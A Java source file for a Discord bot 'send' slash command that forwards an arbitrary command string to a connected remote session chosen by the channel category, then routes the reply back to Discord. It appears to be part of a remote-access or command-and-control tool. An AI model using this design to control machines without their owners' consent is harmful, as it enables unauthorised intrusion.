package de.stynxyxy.angrybot.bot.command;

import de.stynxyxy.angrybot.networking.Server;

import de.stynxyxy.angrybot.networking.Session;
import net.dv8tion.jda.api.entities.Guild;
import net.dv8tion.jda.api.entities.channel.Channel;
import net.dv8tion.jda.api.entities.channel.concrete.Category;
import net.dv8tion.jda.api.events.interaction.command.SlashCommandInteractionEvent;
import net.dv8tion.jda.api.interactions.commands.CommandInteraction;
import net.dv8tion.jda.api.interactions.commands.OptionType;

public class SendCommand extends Command {
    Server server;
    public SendCommand(Server server) {
        super("send", "Sends A Command to the Selected Session and replies with the Answer!",new CommandOption(OptionType.STRING,"command","The Command to send!",true));
        this.server = server;
    }

    @Override
    public void run(SlashCommandInteractionEvent commandInteractionEvent) {
        Category category = getCategorybyEvent(commandInteractionEvent);
        if (category == null ) {
            commandInteractionEvent.reply("This Command does not support this Channel!").setEphemeral(true).queue();
            return;
        }

        int sessionid = -1;
        if (category.getName().contains("Session:")) {
            String raw = category.getName().replace("Session:","").replace(" ","");
            sessionid = Integer.valueOf(raw);
            System.out.println("Set sessionId to : "+sessionid);
        }
        if (sessionid == -1 || sessionid > server.getSessions().size() || sessionid < 0) {
            commandInteractionEvent.reply("There is No Session with the Id: "+sessionid).setEphemeral(true).queue();
            return;
        }
        try {
            Session session = server.getSessions().get(sessionid);
            System.out.println("Got session: "+session.getUserid().toString());
            int id = session.sendCommandwithId(commandInteractionEvent.getOption("command").getAsString());

            System.out.println("Got Command: "+commandInteractionEvent.getOption("command").getAsString());
            commandInteractionEvent.reply("Sent CMD to Session: "+session.getUserid()).setEphemeral(true).queue();

            server.CurrentRespondingCommandChannels.put(id,commandInteractionEvent.getChannel());
        } catch (IndexOutOfBoundsException e) {
            commandInteractionEvent.reply(e.getMessage()).queue();
        }

    }

    public static Category getCategorybyEvent(SlashCommandInteractionEvent event) {
        for (Category category : event.getGuild().getCategories()) {
            for (Channel channel: category.getChannels()) {
                if (channel.getId().equals(event.getChannelId())) {

                    return category;
                }


            }
        }
        return null;

    }
}
